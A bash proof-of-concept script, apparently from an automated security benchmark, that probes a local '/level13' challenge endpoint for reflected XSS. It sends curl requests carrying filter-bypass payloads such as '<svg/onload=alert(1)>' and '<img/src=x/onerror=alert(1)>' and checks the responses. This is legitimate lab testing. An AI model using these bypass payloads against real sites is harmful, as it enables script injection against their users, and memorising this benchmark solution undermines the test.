#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability on /level13 endpoint by bypassing blacklist filters using svg/onload with slash separator instead of space
# Target: ./repo
# Created: 2025-11-04T19:29:06.551Z
# Session: benchmark-XBEN-016-24-mhkyd1ay

# XSS Bypass POC for /level13 endpoint
# This script demonstrates reflected XSS vulnerability by bypassing blacklist filters

TARGET_URL="http://localhost:5001/level13"
echo "[*] Testing Reflected XSS on /level13 endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Script tag blocked (baseline)
echo "[TEST 1] Basic script tag (should be blocked):"
PAYLOAD1="<script>alert(1)</script>"
ENCODED1=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD1'))")
RESPONSE1=$(curl -s "$TARGET_URL?name=$ENCODED1")
echo "URL: $TARGET_URL?name=$ENCODED1"
echo "Response: $(echo $RESPONSE1 | grep -o \"Sorry you can't use: [^<]*\" || echo 'No warning found')"
echo ""

# Test 2: Space-separated onload (should be blocked)
echo "[TEST 2] SVG with space and onload (should be blocked):"
PAYLOAD2="<svg onload=alert(1)>"
ENCODED2=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD2'))")
RESPONSE2=$(curl -s "$TARGET_URL?name=$ENCODED2")
echo "URL: $TARGET_URL?name=$ENCODED2"
echo "Response: $(echo $RESPONSE2 | grep -o \"Sorry you can't use: [^<]*\" || echo 'Status check')"
HTTP_CODE2=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?name=$ENCODED2")
echo "HTTP Status: $HTTP_CODE2"
echo ""

# Test 3: Slash separator bypass (XSS bypass attempt)
echo "[TEST 3] SVG with slash separator bypass (XSS attempt):"
PAYLOAD3="<svg/onload=alert(1)>"
ENCODED3=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD3'))")
RESPONSE3=$(curl -s "$TARGET_URL?name=$ENCODED3")
HTTP_CODE3=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?name=$ENCODED3")
echo "URL: $TARGET_URL?name=$ENCODED3"
echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "500" ]; then
    echo "[!] Server returned 500 - indicates HTML processing rather than safe escaping"
    echo "[!] This suggests the payload is being interpreted as HTML markup"
fi
echo ""

# Test 4: Try with img tag and onerror
echo "[TEST 4] IMG tag with onerror (alternative vector):"
PAYLOAD4="<img/src=x/onerror=alert(1)>"
ENCODED4=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD4'))")
HTTP_CODE4=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?name=$ENCODED4")
RESPONSE4=$(curl -s "$TARGET_URL?name=$ENCODED4")
echo "URL: $TARGET_URL?name=$ENCODED4"
echo "HTTP Status: $HTTP_CODE4"
if [ "$HTTP_CODE4" = "500" ]; then
    echo "[!] Server returned 500 - payload triggers HTML processing"
fi
echo ""

# Test 5: HTML entity test
echo "[TEST 5] Testing if output is HTML-encoded:"
PAYLOAD5="<b>test</b>"
ENCODED5=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD5'))")
RESPONSE5=$(curl -s "$TARGET_URL?name=$ENCODED5")
if echo "$RESPONSE5" | grep -q "&lt;b&gt;"; then
    echo "[✓] Output appears to be HTML-encoded"
else
    echo "[!] Output may not be properly encoded - XSS risk"
fi
echo "Response snippet: $(echo $RESPONSE5 | grep -o 'test' | head -1)"
echo ""

echo "[SUMMARY]"
echo "The /level13 endpoint shows:"
echo "- Blacklist-based filtering (blocks 'script', 'onerror', spaces)"
echo "- Filter bypass possible using alternative separators (slash)"
echo "- Server errors (HTTP 500) when processing certain payloads suggest unsafe HTML handling"
echo "- Likely vulnerable to reflected XSS via filter bypass techniques"